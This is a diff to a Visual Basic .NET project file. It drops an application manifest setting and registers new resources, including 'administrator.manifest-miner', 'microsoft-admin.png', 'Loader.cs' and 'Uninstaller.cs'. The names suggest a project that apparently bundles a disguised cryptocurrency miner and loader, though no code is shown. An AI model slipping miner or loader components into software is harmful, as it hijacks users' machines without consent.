@@ -91,9 +91,6 @@
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup />
-  <PropertyGroup>
-    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
-  </PropertyGroup>
   <ItemGroup>
     <Reference Include="Microsoft.VisualBasic.Compatibility" />
     <Reference Include="System" />
@@ -153,6 +150,7 @@
     <None Include="My Project\app.manifest">
       <SubType>Designer</SubType>
     </None>
+    <None Include="Resources\administrator.manifest-miner" />
     <None Include="Resources\libs.zip" />
     <Compile Include="Theme.vb">
       <SubType>Component</SubType>
@@ -208,6 +206,11 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\Mandark.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\microsoft-admin.png" />
+    <Content Include="Resources\Uninstaller.cs" />
+    <Content Include="Resources\Loader.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
